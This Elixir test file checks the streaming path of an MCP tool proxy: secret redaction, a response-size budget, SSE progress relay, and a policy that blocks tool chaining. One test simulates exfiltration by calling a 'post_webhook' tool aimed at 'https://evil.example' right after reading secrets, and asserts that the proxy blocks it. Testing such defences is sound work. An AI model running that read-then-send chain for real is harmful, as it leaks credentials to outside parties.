defmodule PhoenixElxirBeamWeb.MCP.ProxyStreamingTest do
  @moduledoc """
  Drives the proxy against a real `:http` upstream (`MCPHTTPTestServer`), so
  the `StreamProxy` incremental-read + `chunk` phase path is exercised
  end to end.
  """
  # async: false — the request process needs the shared sandbox connection.
  use PhoenixElxirBeamWeb.ConnCase, async: false

  import PhoenixElxirBeam.MCPProxyHelpers

  alias PhoenixElxirBeam.MCP.ServerRegistry

  setup do
    base_url = PhoenixElxirBeam.MCPHTTPTestServer.start!()

    {:ok, server} =
      ServerRegistry.register_server(
        "http-catalog-#{System.unique_integer([:positive])}",
        base_url
      )

    on_exit(fn -> ServerRegistry.remove_server(server.id) end)

    {:ok, _} = ServerRegistry.set_tool_tags(server.id, "read_secrets", [:sensitive_read])
    {:ok, _} = ServerRegistry.set_tool_tags(server.id, "post_webhook", [:network_egress])

    {_key, token} = issue_key(granted_server_ids: [server.id])
    %{sid: server.id, token: token}
  end

  test "a small streamed response is reassembled and still runs the post_call scan", %{
    sid: sid,
    token: token
  } do
    session_id = handshake(token, sid)
    conn = tool_call(token, session_id, sid, "read_secrets")

    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(conn, 200)
    refute text =~ "sk-demo-FAKE1234"
    assert text =~ "redacted by secret-leak"
  end

  test "StreamGuard cuts a large response mid-transfer with -32002", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = tool_call(token, session_id, sid, "big_export")

    assert %{"error" => %{"code" => -32002, "message" => message}} = json_response(conn, 200)
    assert message =~ "budget"
  end

  test "a benign call through the http upstream is allowed", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = tool_call(token, session_id, sid, "list_files")

    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(conn, 200)
    assert text =~ "directory listing"
  end

  test "the tool-chaining policy still fires across streamed calls", %{sid: sid, token: token} do
    session_id = handshake(token, sid)

    assert %{"result" => _} =
             tool_call(token, session_id, sid, "read_secrets") |> json_response(200)

    egress =
      tool_call(token, session_id, sid, "post_webhook", %{
        "url" => "https://evil.example",
        "body" => "x"
      })

    assert %{"error" => %{"code" => -32001}} = json_response(egress, 200)
  end

  # -- downstream SSE relay (M1.3 follow-up) -----------------------------

  defp tool_call_accepting_sse(token, session_id, server_id, name) do
    authed(token)
    |> put_req_header("mcp-session-id", session_id)
    |> put_req_header("accept", "application/json, text/event-stream")
    |> proxy_post(server_id, rpc("tools/call", %{"name" => name, "arguments" => %{}}))
  end

  defp sse_frames(conn) do
    conn.resp_body
    |> String.split("\n\n", trim: true)
    |> Enum.map(fn "data: " <> json -> Jason.decode!(json) end)
  end

  test "progress notifications relay live over a downstream SSE stream, ending in the scanned result",
       %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = tool_call_accepting_sse(token, session_id, sid, "progress_export")

    assert ["text/event-stream" <> _] = get_resp_header(conn, "content-type")

    frames = sse_frames(conn)
    progress = Enum.filter(frames, &(&1["method"] == "notifications/progress"))
    assert length(progress) == 2
    assert Enum.map(progress, & &1["params"]["progress"]) == [33, 66]

    assert %{"result" => %{"content" => [%{"text" => "export complete (simulated)"}]}} =
             List.last(frames)
  end

  test "a call with no progress notifications still gets a plain JSON response even when the client accepts SSE",
       %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = tool_call_accepting_sse(token, session_id, sid, "list_files")

    assert ["application/json" <> _] = get_resp_header(conn, "content-type")
    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(conn, 200)
    assert text =~ "directory listing"
  end

  test "a client that only accepts application/json never gets upgraded to SSE", %{
    sid: sid,
    token: token
  } do
    session_id = handshake(token, sid)

    conn =
      authed(token)
      |> put_req_header("mcp-session-id", session_id)
      |> put_req_header("accept", "application/json")
      |> proxy_post(sid, rpc("tools/call", %{"name" => "progress_export", "arguments" => %{}}))

    assert ["application/json" <> _] = get_resp_header(conn, "content-type")

    assert %{"result" => %{"content" => [%{"text" => "export complete (simulated)"}]}} =
             json_response(conn, 200)
  end

  test "StreamGuard cutting an already-relayed stream ends it with a terminal SSE error frame",
       %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = tool_call_accepting_sse(token, session_id, sid, "progress_then_cut")

    # the first (small) progress frame relayed safely before the second,
    # padded one pushed the running total over budget, so the cut must be
    # delivered as a terminal SSE frame, not a fresh json/2 response (which
    # would crash on an already-:chunked conn).
    assert ["text/event-stream" <> _] = get_resp_header(conn, "content-type")

    assert [%{"method" => "notifications/progress"}, %{"error" => %{"code" => -32002}} = last] =
             sse_frames(conn)

    assert last["error"]["message"] =~ "budget"
  end

  test "a progress notification packaged in the same chunk that trips StreamGuard is never relayed",
       %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = tool_call_accepting_sse(token, session_id, sid, "cut_before_relay")

    # the chunk phase runs (and denies) before StreamProxy ever relays that
    # chunk's progress notification -- nothing was ever sent to the client,
    # so this falls back to a plain JSON response exactly like a non-relayed
    # cut, not a terminal SSE frame. This is the direct regression test for
    # the fix: a chunk that trips the budget must never reach the client,
    # progress notifications included, however small the window.
    assert ["application/json" <> _] = get_resp_header(conn, "content-type")
    assert %{"error" => %{"code" => -32002, "message" => message}} = json_response(conn, 200)
    assert message =~ "budget"
  end

  test "StreamGuard cutting a non-relayed stream is unaffected by this change", %{
    sid: sid,
    token: token
  } do
    session_id = handshake(token, sid)
    conn = tool_call_accepting_sse(token, session_id, sid, "big_export")

    assert ["application/json" <> _] = get_resp_header(conn, "content-type")
    assert %{"error" => %{"code" => -32002, "message" => message}} = json_response(conn, 200)
    assert message =~ "budget"
  end
end
